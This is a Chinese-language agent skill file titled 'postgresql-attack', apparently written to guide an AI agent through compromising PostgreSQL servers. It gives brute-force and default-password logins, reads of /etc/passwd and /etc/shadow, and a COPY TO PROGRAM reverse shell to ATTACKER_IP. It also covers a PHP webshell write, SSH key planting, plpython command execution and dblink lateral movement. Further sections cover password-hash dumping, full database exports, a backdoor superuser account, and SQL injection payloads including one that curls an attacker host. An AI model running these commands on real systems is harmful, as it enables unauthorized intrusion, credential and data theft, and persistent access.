---
name: postgresql-attack
description: "PostgreSQL 渗透测试与利用。当发现目标开放 5432 端口、PostgreSQL 允许远程连接、需要从数据库提取数据或实现命令执行时使用。覆盖未授权访问、数据库枚举与导出、用户凭据提取（pg_authid 哈希）、SQL 注入变体、文件读取（pg_read_file/COPY）、命令执行（COPY TO PROGRAM）、权限提升（SUPERUSER）、Large Object 滥用、扩展利用（file_fdw/plpython）"
metadata:
  tags: "postgresql,postgres,5432,pg_read_file,copy-to-program,pg_authid,large-object,file_fdw,plpython,dblink,superuser"
  category: "exploit"
---

# PostgreSQL 渗透测试与利用

PostgreSQL 默认监听 5432 端口，功能强大的 SQL 引擎配合丰富的系统函数和扩展机制，一旦获得连接权限，从文件读写到操作系统命令执行仅需几条 SQL。

## 深入参考（必读）
- 完整利用命令和 payload -> 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现

### 1.1 端口扫描与版本识别

```bash
# Nmap 版本探测
nmap -sV -p 5432 TARGET

# PostgreSQL 信息收集脚本
nmap -p 5432 --script pgsql-brute TARGET
```

### 1.2 手动连接测试

```bash
# 测试连通性（无密码）
psql -h TARGET -U postgres -c "SELECT version();"

# 测试连通性（有密码）
PGPASSWORD=postgres psql -h TARGET -U postgres -c "SELECT version();"
```

**关键判断**：
- 返回版本信息 -> 已连接，进入 Phase 3
- 返回 `no pg_hba.conf entry` -> 客户端 IP 未在白名单，需绕过
- 返回 `password authentication failed` -> 需要密码，进入 Phase 2
- 连接超时 -> 端口被防火墙拦截

---

## Phase 2: 认证检测

### 2.1 pg_hba.conf 认证模式

```
# 常见认证方式（影响攻击路径）
trust    — 无需密码，任何人可连接（最危险）
md5      — MD5 哈希认证（可爆破）
scram    — SCRAM-SHA-256 认证（较安全）
peer     — 仅本地 Unix socket，用户名匹配系统用户
```

### 2.2 默认凭据尝试

```bash
# 常见默认用户和密码组合
PGPASSWORD=postgres psql -h TARGET -U postgres -c "SELECT 1;"
PGPASSWORD=admin psql -h TARGET -U admin -c "SELECT 1;"
PGPASSWORD=password psql -h TARGET -U postgres -c "SELECT 1;"
PGPASSWORD=123456 psql -h TARGET -U postgres -c "SELECT 1;"
psql -h TARGET -U postgres -c "SELECT 1;"  # trust 认证无需密码
```

### 2.3 暴力破解

```bash
# Hydra
hydra -L users.txt -P passwords.txt postgres://TARGET

# Nmap
nmap -p 5432 --script pgsql-brute TARGET

# Medusa
medusa -h TARGET -U users.txt -P passwords.txt -M postgres

# Metasploit
msf> use auxiliary/scanner/postgres/postgres_login
msf> set RHOSTS TARGET
msf> run
```

---

## Phase 3: 攻击决策树

```
已连接 PostgreSQL？
├─ 查询当前权限
│   SELECT current_user, current_database();
│   SELECT rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;
│
├─ SUPERUSER 权限
│   ├─ COPY TO PROGRAM 可用 -> RCE (Phase 4.1)
│   ├─ pg_read_file 可用 -> 任意文件读取 (Phase 4.2)
│   ├─ COPY FROM/TO 可用 -> 文件读写 (Phase 4.3)
│   ├─ Large Object 接口 -> 二进制文件读写 (Phase 4.4)
│   ├─ CREATE LANGUAGE -> plpython/plperlu RCE (Phase 4.5)
│   └─ pg_authid 可查 -> 凭据提取 (Phase 5.2)
│
├─ 普通用户权限
│   ├─ pg_read_file 可用（PG >= 14 默认组权限）-> 文件读取 (Phase 4.2)
│   ├─ dblink 扩展已加载 -> 内网横向 / 提权 (Phase 4.6)
│   ├─ pg_execute_server_program 组成员 -> COPY TO PROGRAM RCE
│   ├─ information_schema 可查 -> 数据库枚举 (Phase 5.1)
│   └─ 尝试提权 -> ALTER ROLE / GRANT (Phase 6)
│
└─ SQL 注入场景
    ├─ 堆叠注入可用 -> COPY TO PROGRAM RCE
    ├─ UNION 注入 -> 数据提取
    ├─ 时间盲注 -> pg_sleep() 探测
    └─ 报错注入 -> CAST 类型转换报错
```

### 前置信息收集

```bash
# 当前用户与权限
psql -h TARGET -U postgres -c "SELECT current_user, current_database();"
psql -h TARGET -U postgres -c "SELECT rolsuper, rolcreaterole, rolcreatedb FROM pg_roles WHERE rolname = current_user;"

# 已安装扩展
psql -h TARGET -U postgres -c "SELECT * FROM pg_extension;"

# 可用语言
psql -h TARGET -U postgres -c "SELECT * FROM pg_language;"

# PostgreSQL 版本
psql -h TARGET -U postgres -c "SELECT version();"

# 数据目录
psql -h TARGET -U postgres -c "SHOW data_directory;"

# 配置文件路径
psql -h TARGET -U postgres -c "SHOW config_file;"
psql -h TARGET -U postgres -c "SHOW hba_file;"
```

---

## Phase 4: RCE 与文件操作速查

### 4.1 COPY TO PROGRAM 命令执行（需 SUPERUSER）

```bash
# 直接执行系统命令
psql -h TARGET -U postgres -c "COPY (SELECT '') TO PROGRAM 'id';"

# 反弹 Shell
psql -h TARGET -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"';"

# 写入 webshell
psql -h TARGET -U postgres -c "COPY (SELECT '<?php system(\$_GET[\"cmd\"]); ?>') TO PROGRAM 'tee /var/www/html/shell.php';"
```

### 4.2 文件读取

```bash
# pg_read_file（SUPERUSER 或 pg_read_server_files 组）
psql -h TARGET -U postgres -c "SELECT pg_read_file('/etc/passwd');"
psql -h TARGET -U postgres -c "SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');"

# pg_read_binary_file（读取二进制文件）
psql -h TARGET -U postgres -c "SELECT encode(pg_read_binary_file('/etc/shadow'), 'hex');"

# COPY FROM 读文件到临时表
psql -h TARGET -U postgres -c "CREATE TEMP TABLE tmp(content text); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp;"
```

### 4.3 文件写入

```bash
# COPY TO 写文件
psql -h TARGET -U postgres -c "COPY (SELECT 'malicious content') TO '/tmp/output.txt';"

# 写 SSH 公钥
psql -h TARGET -U postgres -c "COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO '/var/lib/postgresql/.ssh/authorized_keys';"
```

### 4.4 Large Object 文件读写

```bash
# 导入文件为 Large Object
psql -h TARGET -U postgres -c "SELECT lo_import('/etc/passwd');"
# 返回 OID（如 12345）

# 读取 Large Object 内容
psql -h TARGET -U postgres -c "SELECT convert_from(lo_get(12345), 'UTF8');"

# 导出 Large Object 到文件
psql -h TARGET -U postgres -c "SELECT lo_export(12345, '/tmp/exfil.txt');"

# 清理
psql -h TARGET -U postgres -c "SELECT lo_unlink(12345);"
```

### 4.5 plpython/plperlu RCE

```bash
# 创建不受信任的 PL 语言（需 SUPERUSER）
psql -h TARGET -U postgres -c "CREATE LANGUAGE plpython3u;"

# 创建执行命令的函数
psql -h TARGET -U postgres -c "
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS \$\$
import subprocess
return subprocess.check_output(cmd, shell=True).decode()
\$\$ LANGUAGE plpython3u;"

# 执行命令
psql -h TARGET -U postgres -c "SELECT cmd_exec('id');"
psql -h TARGET -U postgres -c "SELECT cmd_exec('cat /etc/passwd');"

# plperlu 替代方案
psql -h TARGET -U postgres -c "CREATE LANGUAGE plperlu;"
psql -h TARGET -U postgres -c "
CREATE OR REPLACE FUNCTION cmd_exec(cmd text) RETURNS text AS \$\$
  my \$output = qx(\$_[0]);
  return \$output;
\$\$ LANGUAGE plperlu;"
```

### 4.6 dblink 横向移动

```bash
# 加载 dblink 扩展
psql -h TARGET -U postgres -c "CREATE EXTENSION IF NOT EXISTS dblink;"

# 连接内网其他 PostgreSQL
psql -h TARGET -U postgres -c "SELECT dblink_connect('conn1', 'host=INTERNAL_TARGET port=5432 user=postgres password=postgres dbname=postgres');"

# 通过 dblink 执行远程查询
psql -h TARGET -U postgres -c "SELECT * FROM dblink('conn1', 'SELECT usename, passwd FROM pg_shadow') AS t(usename text, passwd text);"

# 通过 dblink 执行远程命令（远程需 SUPERUSER）
psql -h TARGET -U postgres -c "SELECT dblink_exec('conn1', 'COPY (SELECT '''') TO PROGRAM ''id''');"
```

-> 更多方法与完整 payload -> 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: 数据提取速查

### 5.1 数据库枚举

```bash
# 列出所有数据库
psql -h TARGET -U postgres -c "\l"

# 列出所有表
psql -h TARGET -U postgres -d DATABASE_NAME -c "\dt *.*"

# 列出所有 Schema
psql -h TARGET -U postgres -d DATABASE_NAME -c "\dn"

# 列出所有角色
psql -h TARGET -U postgres -c "\du"

# 搜索敏感表名
psql -h TARGET -U postgres -d DATABASE_NAME -c "SELECT tablename FROM pg_tables WHERE tablename LIKE '%password%' OR tablename LIKE '%secret%' OR tablename LIKE '%user%';"

# 搜索敏感列名
psql -h TARGET -U postgres -d DATABASE_NAME -c "SELECT table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%password%' OR column_name LIKE '%secret%' OR column_name LIKE '%token%';"
```

### 5.2 凭据提取

```bash
# pg_authid（需 SUPERUSER，包含密码哈希）
psql -h TARGET -U postgres -c "SELECT rolname, rolpassword FROM pg_authid;"

# pg_shadow（旧版兼容视图）
psql -h TARGET -U postgres -c "SELECT usename, passwd FROM pg_shadow;"

# 输出格式示例:
#   md5 哈希: md5<32位hex>（md5 + MD5(password + username)）
#   SCRAM 哈希: SCRAM-SHA-256$<iterations>:<salt>$<stored_key>:<server_key>
```

### 5.3 数据导出

```bash
# pg_dump 导出整个数据库
pg_dump -h TARGET -U postgres DATABASE_NAME > dump.sql

# pg_dump 仅导出特定表
pg_dump -h TARGET -U postgres -t table_name DATABASE_NAME > table_dump.sql

# pg_dumpall 导出所有数据库（含角色信息）
pg_dumpall -h TARGET -U postgres > full_dump.sql

# COPY 导出查询结果到 CSV
psql -h TARGET -U postgres -d DATABASE_NAME -c "COPY (SELECT * FROM users) TO STDOUT WITH CSV HEADER;"
```

---

## Phase 6: 权限提升

```bash
# 检查当前权限
psql -h TARGET -U postgres -c "SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles;"

# 检查特权组成员
psql -h TARGET -U postgres -c "SELECT r.rolname, m.rolname AS member_of FROM pg_auth_members am JOIN pg_roles r ON am.roleid = r.oid JOIN pg_roles m ON am.member = m.oid;"
```

### 提权路径

```
当前权限？
├─ 有 CREATEROLE 权限
│   ├─ GRANT pg_execute_server_program TO current_user; -> COPY TO PROGRAM RCE
│   ├─ GRANT pg_read_server_files TO current_user; -> 任意文件读取
│   └─ GRANT pg_write_server_files TO current_user; -> 任意文件写入
│
├─ 可修改 pg_hba.conf（通过文件写入）
│   └─ 改为 trust 认证 -> 以 SUPERUSER 重新登录
│
├─ 已有 SUPERUSER
│   ├─ ALTER ROLE attacker WITH SUPERUSER; -> 给其他用户提权
│   └─ CREATE ROLE backdoor WITH SUPERUSER LOGIN PASSWORD 'pass'; -> 创建后门账户
│
└─ dblink 可用
    └─ 通过 dblink 以 postgres 身份本地连接（可能绕过认证）
```

---

## SQL 注入速查

```bash
# 版本探测
' UNION SELECT NULL, version()--

# 当前用户
' UNION SELECT NULL, current_user--

# 数据库列表
' UNION SELECT NULL, datname FROM pg_database--

# 表列表
' UNION SELECT NULL, tablename FROM pg_tables WHERE schemaname='public'--

# 时间盲注
'; SELECT pg_sleep(5)--

# 堆叠注入 + RCE（最高威胁）
'; COPY (SELECT '') TO PROGRAM 'curl http://ATTACKER_IP/rce'--

# 报错注入（提取数据）
' AND 1=CAST((SELECT version()) AS int)--

# 布尔盲注
' AND (SELECT SUBSTRING(version(),1,1))='P'--
```

---

## 工具速查

| 工具 | 用途 |
|------|------|
| psql | PostgreSQL 官方客户端 |
| pgcli | 带自动补全的增强客户端 |
| pg_dump / pg_dumpall | 数据库导出工具 |
| hydra / medusa | PostgreSQL 密码爆破 |
| nmap pgsql-brute | Nmap 内置爆破脚本 |
| sqlmap | SQL 注入自动化检测与利用 |
| Metasploit | PostgreSQL 模块集合（登录/枚举/RCE） |

---

## 注意事项

- `COPY TO PROGRAM` 是 PostgreSQL 9.3+ 引入的，低版本不可用
- `pg_read_file` 默认只能读取 `data_directory` 下的文件，SUPERUSER 可读任意路径
- `plpython3u` / `plperlu` 中的 `u` 表示 untrusted（不受信任），仅 SUPERUSER 可创建
- Large Object 操作需要在事务中执行，psql 默认自动提交需注意
- PostgreSQL 日志会记录所有执行的 SQL，注意 `log_statement` 配置级别
- `pg_hba.conf` 修改后需 `SELECT pg_reload_conf();` 或重启生效
- 云托管 PostgreSQL（RDS/Cloud SQL）通常禁用 COPY TO PROGRAM 和文件系统访问
